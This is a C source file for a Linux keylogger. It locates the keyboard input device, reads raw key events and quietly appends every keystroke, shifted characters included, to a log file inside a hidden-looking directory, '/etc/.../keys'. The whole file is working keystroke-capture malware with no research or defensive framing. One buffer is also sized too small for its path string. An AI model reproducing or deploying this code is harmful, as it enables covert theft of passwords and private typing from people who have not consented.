#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/types.h>
#include "log_keys.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

char *get_keyboard_file() {
  static const char * cmd =  "ls /dev/input/by-path/ | grep kbd | tr '\\n' '\\0'";
  FILE *pipe = popen(cmd, "r");

  if (pipe == NULL) {
     fprintf(stderr, "%s\n", "Could not determine keyboard device file");
     return "\0";
  }

  char base_path[20] = "/dev/input/by-path/";
  char kbd_filename[100];

  char *full_path = malloc(200);
  int base_path_size = sizeof(base_path);


  fgets(kbd_filename, 90, pipe);
  strncpy(full_path, base_path, base_path_size);
  strncat(full_path, kbd_filename, 100);

  return full_path;
}


void free_kbd(char *keyboard_file) {
  free(keyboard_file);
}

bool is_shift(__s32 keystroke) {
  if (keystroke == KEY_LEFTSHIFT || keystroke == KEY_RIGHTSHIFT)
    return true;
  else
    return false;
}


int log_keys() {

  struct input_event ie;
  int kbd_fd;
  char *kbd_filename = get_keyboard_file();

  kbd_fd = open(kbd_filename, O_RDONLY);
  fprintf(stderr, "%d\n", kbd_fd);
  FILE *logfile = fopen("/etc/.../keys", "a");
  setbuf(logfile, NULL);

  //TODO: Handle shift pressing and such
  bool shift_held = false;
  while (read(kbd_fd, &ie, sizeof(ie)) > 0) {
    if (ie.type == EV_KEY){

      if (ie.value == KEY_PRESS) {
          if (is_shift(ie.code) == true) {
            shift_held = true;
            //fprintf(stderr, "%s\n", "shift has been pressed (set to true)");
          }
      }
      if (ie.value == KEY_RELEASE) {
        if (is_shift(ie.code) == true) {
          shift_held = false;
          //fprintf(stderr, "%s\n", "shift has been released (set to false)");
        }
      }

      if(ie.value == KEY_RELEASE) {
        if (shift_held == true){
          //fprintf(stderr,"%s", "Shift held is true here 2");
          fputs(shift_key_names[ie.code], logfile);
          //fprintf(stderr, "%s", shift_key_names[ie.code]);
        }
        else {
          fputs(key_names[ie.code], logfile);
          //fprintf(stderr, "%s", key_names[ie.code]);
        }
      }
        //fprintf(stderr, "%s", key_names[ie.code]);
        //fputs(key_names[ie.code], logfile);
        //fprintf(stderr, " value: %d", ie.value);
    }
  }


free_kbd(kbd_filename);
return 0;

}
